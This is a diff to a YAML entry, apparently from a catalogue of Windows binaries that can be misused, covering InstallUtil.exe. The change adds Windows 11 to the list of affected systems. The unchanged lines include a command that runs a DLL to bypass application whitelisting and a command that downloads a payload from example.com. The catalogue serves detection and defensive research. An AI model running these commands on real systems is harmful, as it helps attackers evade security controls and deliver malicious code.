@@ -10,14 +10,14 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
     Category: Execute
     Privileges: User
     MitreID: T1218.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: InstallUtil.exe https://example.com/payload
     Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
     Usecase: Downloads payload from remote server
